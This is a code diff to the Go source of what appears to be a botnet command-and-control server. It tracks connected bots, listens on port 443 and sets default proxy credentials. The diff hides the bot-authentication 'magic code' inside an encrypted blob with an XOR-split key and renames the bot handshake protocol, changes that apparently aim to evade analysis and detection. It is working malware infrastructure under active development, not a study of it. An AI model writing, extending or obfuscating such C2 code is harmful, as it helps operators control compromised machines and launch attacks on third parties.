@@ -1,8 +1,10 @@
 package main
 
 import (
+	"encoding/hex"
 	"encoding/json"
 	"fmt"
+	"log"
 	"net"
 	"os"
 	"os/exec"
@@ -12,6 +14,8 @@ import (
 	"sync"
 	"syscall"
 	"time"
+
+	"golang.org/x/crypto/chacha20poly1305"
 )
 
 // usersFile is resolved at init to support running from project root or cnc dir
@@ -32,6 +36,45 @@ func init() {
 		}
 	}
 	usersFile = "db/users.json"
+
+	// Decode MAGIC_CODE from encrypted blob
+	MAGIC_CODE = decodeMagicCode()
+}
+
+// decodeMagicCode reconstructs the key from XOR-split halves and decrypts
+// the ChaCha20-Poly1305 AEAD blob.
+func decodeMagicCode() string {
+	if _mcBlob == "" {
+		log.Fatal("MAGIC_CODE blob is empty — run setup.py first")
+	}
+	blob, err := hex.DecodeString(_mcBlob)
+	if err != nil {
+		log.Fatalf("MAGIC_CODE hex decode: %v", err)
+	}
+	// Reconstruct key: key[i] = _mcKey0[i] ^ _mcKey1[i]
+	var key [32]byte
+	for i := 0; i < 32; i++ {
+		key[i] = _mcKey0[i] ^ _mcKey1[i]
+	}
+	aead, err := chacha20poly1305.New(key[:])
+	if err != nil {
+		log.Fatalf("MAGIC_CODE cipher init: %v", err)
+	}
+	nonceSize := aead.NonceSize() // 12
+	if len(blob) < nonceSize {
+		log.Fatal("MAGIC_CODE blob too short")
+	}
+	nonce := blob[:nonceSize]
+	ct := blob[nonceSize:]
+	pt, err := aead.Open(nil, nonce, ct, nil)
+	if err != nil {
+		log.Fatalf("MAGIC_CODE decrypt: %v", err)
+	}
+	// Zero the key
+	for i := range key {
+		key[i] = 0
+	}
+	return string(pt)
 }
 
 const (
@@ -43,15 +86,25 @@ const (
 	BOT_SERVER_PORTS = "443" // comma-separated, set by setup.py
 	USER_SERVER_PORT = "420"
 
-	MAGIC_CODE       = "slQVVAqOrkWEti*X"
-	PROTOCOL_VERSION = "v4.6.9"
+	PROTOCOL_VERSION = "r1.1-stable"
 
 	DEFAULT_PROXY_USER = "vision" // set by setup.py
 	DEFAULT_PROXY_PASS = "vision" // set by setup.py
 )
 
+// MAGIC_CODE — encrypted at compile time, decoded at init.
+// _mcBlob is a hex-encoded ChaCha20-Poly1305 ciphertext (nonce‖ct‖tag).
+// _mcKey0 / _mcKey1 are XOR-split halves of the 32-byte decryption key.
+// All three are patched by setup.py.
+var (
+	_mcBlob = "17fd58b9f6dc52decb18015f26a7f4d20bc79ab3dcf2c590239343c95d8ad4d194925e74f74a3ea987ba82bd" // set by setup.py — hex(nonce‖aead_ct)
+	_mcKey0 = [32]byte{0x9b, 0x1e, 0xe3, 0x58, 0x3a, 0xd3, 0x4b, 0x65, 0xb9, 0x2e, 0xf8, 0x0d, 0xc9, 0xfd, 0x9e, 0x53, 0x1b, 0x48, 0x30, 0x83, 0x11, 0x19, 0x4c, 0x2e, 0xfd, 0xd2, 0xb2, 0x73, 0x16, 0x2d, 0xf2, 0x85}
+	_mcKey1 = [32]byte{0x1c, 0x06, 0x61, 0xc2, 0xa2, 0x5a, 0x5d, 0x9d, 0x28, 0x55, 0xf1, 0x76, 0x76, 0xd9, 0x9f, 0xbd, 0x4b, 0x01, 0x97, 0xe9, 0x5d, 0x1a, 0xf7, 0x85, 0x8f, 0xe2, 0x5f, 0x17, 0x64, 0x2b, 0x09, 0xab}
+	MAGIC_CODE string
+)
+
 type BotConnection struct {
-	conn          net.Conn
+	conn          *CipherConn
 	botID         string
 	connectedAt   time.Time
 	lastPing      time.Time
@@ -250,7 +303,7 @@ func main() {
 
 	go cleanupDeadBots()
 
-	// Start bot server on all configured ports (raw TCP with VPE2 detection)
+	// Start bot server on all configured ports (raw TCP with EZF3 detection)
 	botPorts := strings.Split(BOT_SERVER_PORTS, ",")
 	for _, bp := range botPorts {
 		bp = strings.TrimSpace(bp)
@@ -258,7 +311,7 @@ func main() {
 			continue
 		}
 		go func(port string) {
-			logMsg("[☾℣☽] Bot server starting on %s:%s (VPE2)", BOT_SERVER_IP, port)
+			logMsg("[☾℣☽] Bot server starting on %s:%s (EZF3)", BOT_SERVER_IP, port)
 			botListener, err := net.Listen("tcp", BOT_SERVER_IP+":"+port)
 			if err != nil {
 				fmt.Printf("[FATAL] Error starting bot server on port %s: %v\n", port, err)
@@ -266,7 +319,7 @@ func main() {
 			}
 			defer botListener.Close()
 
-			logMsg("[☾℣☽] Bot server is running on port %s (VPE2)", port)
+			logMsg("[☾℣☽] Bot server is running on port %s (EZF3)", port)
 
 			for {
 				conn, err := botListener.Accept()
@@ -275,7 +328,7 @@ func main() {
 					continue
 				}
 				go func(c net.Conn) {
-					enc, err := HandleVPE2Handshake(c, MAGIC_CODE)
+					enc, err := HandleEZF3Handshake(c, MAGIC_CODE)
 					if err != nil {
 						c.Close()
 						return
